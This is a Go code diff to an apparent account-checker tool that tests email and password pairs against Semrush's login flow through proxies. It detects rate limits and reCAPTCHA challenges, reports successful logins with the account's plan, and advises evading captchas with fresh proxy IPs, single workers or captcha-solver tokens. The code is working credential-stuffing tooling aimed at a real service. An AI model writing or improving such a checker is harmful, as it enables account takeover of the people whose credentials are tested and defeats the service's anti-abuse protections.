@@ -53,7 +53,12 @@ func (c *Checker) checkSemrush(email, password string, proxyURL *url.URL) CheckR
 		return result
 	}
 
-	// Step 2: POST /olaf/init (bot/session bootstrap)
+	// Step 2: GET /olaf then POST /olaf/init (_sm_bot session bootstrap)
+	_, _, _, _ = c.doRequest(client, "GET", c.cfg.BaseURL()+"/olaf", map[string]string{
+		"Accept":     "*/*",
+		"Referer":    referer,
+		"User-Agent": c.cfg.UserAgent,
+	}, "")
 	_, olafStatus, _, err := c.doRequest(client, "POST", c.cfg.SemrushOlafInitURL(), map[string]string{
 		"Accept":     "*/*",
 		"Origin":     c.cfg.BaseURL(),
@@ -72,9 +77,9 @@ func (c *Checker) checkSemrush(email, password string, proxyURL *url.URL) CheckR
 		return result
 	}
 
-	// Step 3: POST /sso/options (SSO flags)
+	// Step 3: POST /sso/options (SSO flags — may indicate captcha)
 	optsBody := fmt.Sprintf(`{"withCredentials":true,"user-agent-hash":%s}`, jsonString(uaHash))
-	_, optsStatus, _, err := c.doRequest(client, "POST", c.cfg.SemrushSSOOptionsURL(), map[string]string{
+	optsResp, optsStatus, _, err := c.doRequest(client, "POST", c.cfg.SemrushSSOOptionsURL(), map[string]string{
 		"Accept":       "application/json, text/plain, */*",
 		"Content-Type": "application/json",
 		"Origin":       c.cfg.BaseURL(),
@@ -90,6 +95,11 @@ func (c *Checker) checkSemrush(email, password string, proxyURL *url.URL) CheckR
 	if optsStatus == http.StatusTooManyRequests {
 		result.Status = StatusRateLimited
 		result.Reason = rateLimitReason("sso/options HTTP 429")
+		return result
+	}
+	if semrushResponseNeedsRecaptcha(optsResp) {
+		result.Status = StatusRecaptchaRequired
+		result.Reason = "reCAPTCHA required before login (too many checks from same IP/fingerprint)"
 		return result
 	}
 
@@ -123,8 +133,13 @@ func (c *Checker) checkSemrush(email, password string, proxyURL *url.URL) CheckR
 	}
 
 	if failReason := parseSemrushAuthFailure(authBody, authStatus); failReason != "" {
-		result.Status = StatusFail
-		result.Reason = failReason
+		if failReason == "recaptcha_required" {
+			result.Status = StatusRecaptchaRequired
+			result.Reason = "reCAPTCHA required — use 1 worker, fresh proxy IP, or captcha solver token"
+		} else {
+			result.Status = StatusFail
+			result.Reason = failReason
+		}
 		return result
 	}
 	if !semrushAuthSucceeded(authBody, authStatus) {
@@ -198,62 +213,105 @@ func (c *Checker) fetchURL(client *http.Client, rawURL string, headers map[strin
 	return body, status, nil
 }
 
-func parseSemrushAuthFailure(body string, status int) string {
+func semrushErrorCode(body string) string {
+	if code, ok := jsonPathString(body, "code"); ok {
+		return strings.ToUpper(strings.TrimSpace(code))
+	}
+	if code, ok := jsonPathString(body, "error.code"); ok {
+		return strings.ToUpper(strings.TrimSpace(code))
+	}
+	return ""
+}
+
+func semrushResponseNeedsRecaptcha(body string) bool {
+	code := semrushErrorCode(body)
+	if code == "ERROR_RECAPTCHA" || code == "ERROR_CAPTCHA" {
+		return true
+	}
 	lower := strings.ToLower(body)
+	if strings.Contains(lower, `"recaptcha_authorize"`) && strings.Contains(lower, `"enabled":true`) {
+		return true
+	}
+	if strings.Contains(lower, `"captcha"`) && strings.Contains(lower, `"required":true`) {
+		return true
+	}
+	return false
+}
+
+func parseSemrushAuthFailure(body string, status int) string {
+	code := semrushErrorCode(body)
+	lower := strings.ToLower(body)
+
+	switch code {
+	case "ERROR_RECAPTCHA", "ERROR_CAPTCHA":
+		return "recaptcha_required"
+	case "ERROR_INVALID_CREDENTIALS", "ERROR_WRONG_PASSWORD", "ERROR_USER_NOT_FOUND":
+		return "invalid email or password"
+	case "ERROR_UAHASH_INVALID":
+		return "invalid user-agent-hash — update user_agent_hash in semrush.json from browser"
+	case "ERROR_UAHASH_REQUIRED":
+		return "missing user-agent-hash"
+	case "ERROR_TOKEN_INVALID":
+		return "invalid login token"
+	}
+
 	failPhrases := map[string]string{
-		"error_invalid_credentials":  "invalid email or password",
-		"invalid email or password": "invalid email or password",
+		"invalid email or password":   "invalid email or password",
 		"incorrect email or password": "invalid email or password",
-		"error_uahash_invalid":     "invalid user-agent-hash — update user_agent_hash in semrush.json from browser",
-		"error_uahash_required":    "missing user-agent-hash",
-		"error_recaptcha":          "recaptcha required",
-		"recaptcha":                  "recaptcha required",
-		"error_token_invalid":        "invalid login token",
-		"account locked":             "account locked",
-		"too many attempts":          "too many attempts",
+		"wrong password":              "invalid email or password",
+		"account locked":              "account locked",
+		"too many attempts":           "too many attempts",
 	}
 	for needle, reason := range failPhrases {
 		if strings.Contains(lower, needle) {
 			return reason
 		}
 	}
-	if status == http.StatusUnauthorized || status == http.StatusForbidden {
-		return "not authenticated"
+	if code != "" && strings.HasPrefix(code, "ERROR") {
+		return code
 	}
-	if status == http.StatusBadRequest && strings.Contains(lower, "error") {
+	if status == http.StatusUnauthorized || status == http.StatusForbidden {
+		return "invalid email or password"
+	}
+	if status == http.StatusBadRequest {
 		if msg, ok := jsonPathString(body, "message"); ok && msg != "" {
 			return msg
-		}
-		if code, ok := jsonPathString(body, "code"); ok && code != "" {
-			return code
 		}
 	}
 	return ""
 }
 
 func semrushAuthSucceeded(body string, status int) bool {
-	if status >= 200 && status < 300 {
-		lower := strings.ToLower(body)
-		if strings.Contains(lower, `"error"`) && !strings.Contains(lower, `"error":false`) {
-			if code, ok := jsonPathString(body, "code"); ok && strings.HasPrefix(strings.ToUpper(code), "ERROR") {
-				return false
-			}
-		}
-		if redirect, ok := jsonPathString(body, "redirect"); ok && redirect != "" {
-			return true
-		}
-		if redirect, ok := jsonPathString(body, "redirect_to"); ok && redirect != "" {
-			return true
-		}
-		if okVal, ok := jsonPathString(body, "ok"); ok && okVal == "true" {
-			return true
-		}
-		if success, ok := jsonPathString(body, "success"); ok && success == "true" {
-			return true
-		}
-		return status == http.StatusOK || status == http.StatusNoContent
+	if status < 200 || status >= 300 {
+		return false
 	}
-	return false
+	code := semrushErrorCode(body)
+	if strings.HasPrefix(code, "ERROR") {
+		return false
+	}
+	if redirect, ok := jsonPathString(body, "redirect"); ok && redirect != "" {
+		return true
+	}
+	if redirect, ok := jsonPathString(body, "redirect_to"); ok && redirect != "" {
+		return true
+	}
+	if redirect, ok := jsonPathString(body, "redirectUrl"); ok && redirect != "" {
+		return true
+	}
+	if okVal, ok := jsonPathString(body, "ok"); ok && okVal == "true" {
+		return true
+	}
+	if success, ok := jsonPathString(body, "success"); ok && success == "true" {
+		return true
+	}
+	trimmed := strings.TrimSpace(body)
+	if trimmed == "" || trimmed == "{}" {
+		return status == http.StatusOK || status == http.StatusCreated || status == http.StatusNoContent
+	}
+	if strings.HasPrefix(trimmed, "{") {
+		return !strings.Contains(strings.ToLower(trimmed), `"error"`)
+	}
+	return true
 }
 
 func extractSemrushPlanFromJSON(body string) (string, bool) {
